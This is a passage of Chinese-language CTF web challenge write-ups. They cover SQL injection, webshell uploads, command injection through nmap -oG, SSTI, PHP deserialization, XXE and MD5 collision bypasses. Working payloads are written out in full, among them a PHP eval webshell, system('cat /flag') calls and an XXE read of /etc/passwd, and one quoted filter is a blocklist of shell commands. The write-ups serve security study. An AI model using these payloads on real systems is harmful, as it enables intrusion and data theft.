payload：对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。

~~~php
<?php
highlight_file(__FILE__);
	class FileHandler {
        public $op = 2;
        public $filename = "flag.php";
        public $content;
    }
    $a = new FileHandler();
        $b = serialize($a);
        echo($b);
?>

~~~

![image-20210525193154240](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525193154240.png)







### [MRCTF2020]你传你🐎呢

上传.htaccess和.png两个文件即可

![image-20210520194054808](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520194054808.png)

上传图片格式解析成功，说明一句话木马上传成功，用蚁剑成功连接即可。

![image-20210520194750013](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520194750013.png)

### [GYCTF2020]Blacklist

![image-20210520215927831](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520215927831.png)

![image-20210520215947311](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520215947311.png)

用堆叠注入可以。

查询databases:

![image-20210520220341018](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220341018.png)

查询数据库中的表：

![image-20210520220559365](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220559365.png)

查询 `FlagHere` 表中的字段：

![image-20210520220648149](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220648149.png)

查询`words`表中的字段：

![image-20210520220750951](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210520220750951.png)

**由此可以想到该输入框的SQL语句应该是 `select id,data from words where id = ?`**

因为可以是堆叠查询，这时候我们可以使用改名的方法，把含有flag的"FlagHere"表改名为words，再把flag字段改名为id，结合上面的1' or 1 #爆出表内所有的内容就可以查到flag了。

payload:

~~~sql
1';rename table `words` to `words1`;rename table `FlagHere` to `words`;alter table words change flag id varchar(100) character set utf8 collate utf8_general_ci NOT NULL;desc words;#
~~~

![image-20210521094218343](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521094218343.png)

rename和alter关键字都被过滤了！！！

查看别人的wp,使用`Handler`

MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。
————————————————
`HANDLER ... OPEN`语句打开一个表，使其可以使用后续`HANDLER ... READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER ... CLOSE`或会话终止之前不会关闭 

最终获取flag的payload：

~~~
?inject=1';handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` close#
~~~

![image-20210521095405104](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521095405104.png)

又学到了一个姿势。



### [MRCTF2020]Ez_bypass

打开网页是PHP代码，开始代码审计吧

```php
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {//使用数组绕过md5  ?id[]=a&gg[]=b
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))// 用PHP弱类型特殊性绕过 passwd=1234567a
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}
```

成功绕过两处PHP代码限制，获得flag值

![image-20210521100210960](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521100210960.png)

### [BUUCTF 2018]Online Tool

进入网站就是代码，开始审计

~~~php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
~~~

https://blog.csdn.net/qq_26406447/article/details/100711933



传递一个 `host`参数，经过两个函数 `escapeshellarg` 、`escapeshellcmd`的处理

[PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)](https://paper.seebug.org/164/)，这个文章里介绍两个函数一起用会引发问题

> 1. 传入的参数是：172.17.0.2' -v -d a=1经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
> 2. 经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：反斜线（\）会在以下字符之前插入： `&#;`|*?~<>^()[]{}$\`, `\x0A` 和 `\xFF`。 `'` 和 `"` 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符都会被空格代替。
> 3. 最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。

nmap工具中有一个参数是可以创建文件的 `-oG`,可以实现将命令和结果写到文件，payload

```
?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
?host=\' <?php @eval($_POST["hack"]);?> -oG hack.php \' //escapeshellarg()执行
?host=''\\'' \<\?php \@eval\(\$_POST\["hack"\]\);\?\> -oG hack.php ''\\''
```

成功把hack.php文件传到服务器，用蚁剑连接一句话木马文件即可。

![image-20210526125439243](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526125439243.png)

![image-20210526125407846](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210526125407846.png)



### [GXYCTF2019]BabyUpload

![image-20210521205039601](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205039601.png)

![image-20210521205048515](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205048515.png)

上传 `.htaccess`和 `.png`文件即可，并且用长语法PHP代码绕过限制，用蚁剑连接即可。

![image-20210521205209107](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205209107.png)

### [强网杯 2019]高明的黑客

![image-20210521205411113](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205411113.png)

下载完成之后，解压文件后发现，文件夹中的所有文件名字和文件中的内容都被编码了

![image-20210521205508938](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205508938.png)

![image-20210521205547451](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521205547451.png)

不是base64、base32编码，不是md5和rot13。好像并不能还原这些编码，并且这些编码后的代码也能正确执行，看了别人的WP，写python脚本来找含有get或者post请求漏洞的PHP文件。

~~~python
import os
import requests
import re
import threading
import time
print('start：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)
filePath = r"D:\phpstudy\phpstudy_pro\WWW\src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}
    params = {}
    for m in gets: #遍历所有含有$_GET()方法的
        params[m] = "echo 'aaa';"
    for n in posts:
        data[n] = "echo 'aaa';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)
    req.close()
    req.encoding = 'utf-8'
    content = req.text
    # print(content)
    if "aaa" in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '111';")
            content = req.text
            req.close()
            if "111" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '222';"})
                content = req.text
                req.close()
                if "222" in content:
                    break
        if flag == 1:
            param = a
        else:
            param = b
        print('file: '+file+"  and param:%s" %param)
        print('endtime: ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content, args=(i,))
    t.start()


~~~

![image-20210521215022951](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521215022951.png)

https://www.zhaoj.in/read-5873.html#0x02

![image-20210521222210419](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210521222210419.png)

去这个文件里看看。这一段是关键，拼接了一个 System 出来调用 Efa5BVG 这个参数。

`system($_GET['Efa5BVG'])`

![image-20210530163754515](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530163754515.png)

### [GXYCTF2019]禁止套娃

![image-20210522155734364](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522155734364.png)

注释没有什么东西，抓包和扫描目录，看看能发现什么东西？

扫描出.git

![image-20210522161120494](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522161120494.png)

~~~php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {//(?R)表示递归
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>

~~~

> localeconv() 函数返回一包含本地数字及货币格式信息的数组。
> scandir() 列出 images 目录中的文件和目录。
> readfile() 输出一个文件。
> current() 返回数组中的当前单元, 默认取第一个值。
> pos()是 current() 的别名。
> next() 函数将内部指针指向数组中的下一个元素，并输出。
> array_reverse()以相反的元素顺序返回数组。
> highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。

https://www.cnblogs.com/wangtanzhi/p/12260986.html

**本题考查无参数RCE**

`current(localeconv())`永远都是个点

payload:

~~~
?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));
~~~

![image-20210522164917590](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522164917590.png)

或者使用session

![image-20210522165838223](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522165838223.png)





### [GWCTF 2019]我有一个数据库

数据库版本有文件包含漏洞，百度一下payload就可以了

![image-20210522172659715](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522172659715.png)





### [RoarCTF 2019]Easy Java

前置知识：

~~~
WEB-INF主要包含一下文件或目录:
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
~~~

help超链接的源码：

![image-20210530164458018](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530164458018.png)

在url栏上显示了貌似是文件下载，根据java配置文件的目录，咱们可以先去获取web.xml配置文件的信息，修改一下地址，让它指向`/WEB-INF/web.xml`,结果文件还是找不到，抓包把get方法改成了post方法，成功获得web.xml的信息并且看到了flag的路径

![image-20210530165141958](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165141958.png)

去访问该class文件的路径，获得class文件

![image-20210530165427023](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165427023.png)

复制出来，咱们用工具反编译一下即可获得java代码

![image-20210530165811478](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165811478.png)

![image-20210530165944724](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530165944724.png)

**其中，把get方法改成post方法的原因应该是java后台代码中并没有执行doGet()方法，而是在doPost()方法中写的运行代码**

### [BJDCTF2020]The mystery of ip

hint.php源代码

![image-20210522200551504](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522200551504.png)

flag.php,显示了本机的外网地址

![image-20210522200752779](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522200752779.png)

修改一下数据包client-ip或者XFF字段，成功修改了显示的ip地址

![image-20210522200928089](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522200928089.png)

猜测一下PHP代码中有获取ip地址的代码，试试存在SQL注入吗？好像不存在

看看别人的WP，存在SSTI

![image-20210522201647861](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522201647861.png)



![image-20210522202112920](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522202112920.png)

成功执行phpinfo()信息

用同样的方法可以轻松获得flag：

payload：

~~~
{if system("ls /")}{/if}或者{system("ls /")}
{if system("cat /flag")}{/if}或者{system("cat /flag")}
~~~

![image-20210522202301199](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522202301199.png)

![image-20210522202331777](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522202331777.png)

https://blog.csdn.net/qq_45521281/article/details/107556915

### [BJDCTF2020]ZJCTF，不过如此

直接代码审计

~~~php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){//使用data伪协议添加内容
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    //使用php://filter协议查看php文件的源码
}
else{
    highlight_file(__FILE__);
}
?>
~~~

利用上述代码的payload，其中用到了的远程文件包含中的两个伪协议

~~~
?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&file=php://filter/convert.base64-encode/resource=next.php
~~~



![image-20210522203713505](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210522203713505.png)

结果base64解码：

~~~php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',//两边添加了圆括号，反方引用
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

~~~

没看懂complex函数的功能，看看别人的WP

**preg_replace**

`preg_replace(pattern, replacement, subject)`

 当pattern传入的正则表达式带有`/e`时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。
这里第二个参数固定为strtolower("\\1")
这里的\\\1实际上体现为\1

>  反向引用
对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

payload:

~~~
///next.php?\S*=${getFlag()}&cmd=system('cat /flag');
~~~

\S:匹配任何非空白字符。* : 匹配前面的子表达式零次或多次。

\S*: 表示匹配0次或多次的任何非空白符

![image-20210530172314819](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530172314819.png)

成功匹配getFlag（）方法，然后在传递cmd参数为系统命令执行即可

![image-20210530173256220](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530173256220.png)

![image-20210530173312605](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530173312605.png)

### [BJDCTF2020]Mark loves  cat

存在.git泄露

![image-20210523140600446](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523140600446.png)

获得index.php，下面是php代码片段：

~~~php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){ //?a=ljw-->$x=a;$y=ljw;
    $$x = $y;		//$a=ljw
}

foreach($_GET as $x => $y){	//?a=ljw-->$x=a;$y=ljw;
    $$x = $$y;				//$a=$ljw;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag; 
?>
~~~

代码的意思好像是会覆盖`$flag`变量，这样就不会执行flag.php文件中的$flag，我们要想办法绕过代码中的限制。

使用变量覆盖，可以用$flag的值覆盖$yds或者$is,并对应执行exit($yds)或者exit($is)

第一种方法：执行 exit($yds)

~~~
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
~~~

只要传输的变量名不是flag就会执行，可以直接用get方法传递参数：`yds=flag`，这个参数经过执行 $$x = $$y;就会变成$yds=$flag，这样$flag值就会覆盖$yds，并且也不符合`if(!isset($_GET['flag']) && !isset($_POST['flag']))`，成功执行exit($flag)

第二种方法：exit($is)

~~~
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
~~~

如果传输的变量存在flag===flag就会执行，要把$is变量覆盖为$flag

首先要get方法传输is=flag --> $is=$flag   

还要符合 `if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag')`就要用get方法传递flag=flag   -->$flag=$flag(没变化，还是在flag.php中获取值)

组合payload：is=flag&flag=flag  -->$is=$flag&$flag=$flag

![image-20210523145203792](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523145203792.png)

![image-20210523145237567](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523145237567.png)

这两种方法都成功获得flag值

### [安洵杯 2019]easy_web



![image-20210523150024399](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523150024399.png)

在源码中发现了，估计后面会用到md5

![image-20210523150051515](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523150051515.png)

![image-20210523151040382](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523151040382.png)

常用命令被禁止了

img的值经过base64解密-->base64解密-->hex得到图片名为555.png

然后可以使用这种办法获得index的源码   hex-->base64加密-->base64加密
![image-20210523153516965](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210523153516965.png)

~~~php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) { //常用命令都被禁止了
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) { //这里存在绕过，使用MD5强碰撞
        echo `$cmd`; //``符号是执行运算符，使用反引号运算符“`”的效果与函数 shell_exec() 相同。
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
~~~

[浅谈md5弱类型比较和强碰撞](https://www.secpulse.com/archives/153442.html)

可以使用 `fastcoll.exe`工具生成两个md5值一样的文件

> 1. 找到一个可执行文件, 我们以它的文件内容为前缀,这里我选择的是windows下的init.txt
>
> 2. 打开cmd命令行: fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt  2.txt， 此时生成两个文件1.txt和2.txt,  而此时发现这两个文件都同init.txt一样是可以运行的

![image-20210530181416844](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530181416844.png)

使用MD5验证工具可以看到这两个文件的MD5值是一样的，但是里面的内容却不一样

![image-20210530181740640](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530181740640.png)

使用php脚本查看md5值：

~~~php
<?php
function  readmyfile($path){
    $fh = fopen($path, "rb");
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
}
echo '二进制hash '. md5( (readmyfile("1.txt")));
echo "<br><br>\r\n";
echo  'URLENCODE '. urlencode(readmyfile("1.txt"));
echo "<br><br>\r\n";
echo 'URLENCODE hash '.md5(urlencode (readmyfile("1.txt")));
echo "<br><br>\r\n";
echo '二进制hash '.md5( (readmyfile("2.txt")));
echo "<br><br>\r\n";
echo  'URLENCODE '.  urlencode(readmyfile("2.txt"));
echo "<br><br>\r\n";
echo 'URLENCODE hash '.md5( urlencode(readmyfile("2.txt")));
echo "<br><br>\r\n";
~~~

![image-20210530182623686](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530182623686.png)

**这里有个坑，使用burp里的url编码和在线网站的url编码都会导致错误，可能是因为文件里有乱码的原因吧,建议使用php脚本的url编码**

于是咱们把这两个文件里的内容进行url编码使用参数传递即可绕过限制

现在还有一个cmd参数需要传递，很明显就是传递linux命令，但是上面的源码中限制了很多命令，咱们可以使用命令之间+\进行绕过

例如：`ls 、l\s`这两个命令执行的结果是一致的

![image-20210530183824276](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530183824276.png)

所以下一步就是找到flag文件

![image-20210530184018159](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530184018159.png)

payload:

~~~
/index.php?img=&cmd=ca\t+/flag
~~~

成功获得flag

![image-20210530184114495](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210530184114495.png)

### 《从0到1：CTFer成长之路》题目——sql注入1

经过测试，这题是单引号字符型注入![image-20210524110208950](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110208950.png)

> `version`: 5.5.64-MariaDB-1ubuntu0.14.04.1  
>
> `database`: note
>
> `user`: root@localhost  

获取所有数据库：

![image-20210524110507171](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110507171.png)

获取 `note`数据库中的表：

![image-20210524110600886](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110600886.png)

获取 `fl4g`表的所有字段：

![image-20210524110703356](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110703356.png)

获取`note.fl4g`表中的内容:

![image-20210524110812372](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524110812372.png)

成功获得flag

### “百度杯”CTF比赛 十二月场——Blog（。。。。）

![image-20210524111619121](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524111619121.png)

扫描目录发现了flag.php，但是里面什么都没有，估计是利用这个网站的漏洞去读取php源码



~~~
http://9a6a9de81cb44dc0ac52841e88c2ce803fdb51883d6b48b3.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../../ 
~~~



![image-20210524112618095](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524112618095.png)

![image-20210524120228991](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524120228991.png)

![image-20210524120239166](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524120239166.png)





### [网鼎杯 2020 朱雀组]phpweb

![image-20210524141929226](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524141929226.png)

~~~php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
?>
~~~

序列化魔术方法：

> \_\_wakeup() //使用unserialize时触发
>
> \_\__sleep() //使用serialize时触发
> \_\_destruct() //对象被销毁时触发
> \_\_call() //在对象上下文中调用不可访问的方法时触发
> \_\_callStatic() //在静态上下文中调用不可访问的方法时触发
> \_\_get() //用于从不可访问的属性读取数据
> \_\_set() //用于将数据写入不可访问的属性
> \_\_isset() //在不可访问的属性上调用isset()或empty()触发
> \_\_unset() //在不可访问的属性上使用unset()时触发
> \_\_toString() //把类当作字符串使用时触发
> \_\_invoke() //当脚本尝试将对象调用为函数时触发

序列化payload：

~~~php
<?php
 class Test {
        var $p = "ls";
        var $func = "system";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
$a = new Test();
echo serialize($a);

?>
//结果：O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}
~~~

![image-20210524143316796](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524143316796.png)

但是找不到flag在哪。构造exp。

~~~
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}
~~~

![image-20210524150336787](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524150336787.png)

### [NCTF2019]Fake XML cookbook

本关卡考察的是XXE

![image-20210531090644239](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531090644239.png)

抓取流量包，发现传输的参数经过了加工变成了xml格式的数据，并且返回的数据包含username值

![image-20210531090940477](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531090940477.png)

怀疑是否存在XXE注入，可以使用外部实体引用的方法，用用户名aa返回想要获得系统信息

payload：

~~~xml-dtd
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE user[
    <!ENTITY aa SYSTEM "file:///etc/passwd">
    ]>
<user><username>&aa;</username><password>aa</password></user><!--注意&aa后面有个分号-->
~~~



获取/etc/passwd文件的内容，测试是否存在XXE漏洞

![image-20210531091938329](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210531091938329.png)



获取flag文件的值

![image-20210524203423276](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203423276.png)

直接读取/flag文件，获取flag值

![image-20210524203643801](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210524203643801.png)

**外部实体示例代码：**

```xml-dtd
<?xml version = "1.0" encoding = "utf-8"?>
<!DOCTYPE author [
    <!ENTITY file SYSTEM "file:///etc/passwd">
    <!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&file;©right;</author>
```

外部实体可支持http、file等协议。不同程序支持的协议不同：

![img](CTF%E5%88%B7%E9%A2%98WriteUp.assets/20191202150935-b26e4a30-14d2-1.png)

PHP引用外部实体，**常见的利用协议**：

```
file://文件绝对路径 如：file:///etc/passwd
http://url/file.txt
php://filter/read=convert.base64-encode/resource=xxx.php
```



### [De1CTF 2019]SSRF Me（。。。。）

![image-20210525172355395](CTF%E5%88%B7%E9%A2%98WriteUp.assets/image-20210525172355395.png)

进入网站是一段python代码，用的是Flask框架，不太熟悉

~~~python
#! /usr/bin/env python
# #encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')
 
app = Flask(__name__)
 
secert_key = os.urandom(16)
 
class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):
            os.mkdir(self.sandbox)
 
    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result
 
    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False
 
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)
 
@app.route('/De1ta',methods=['GET','POST'])
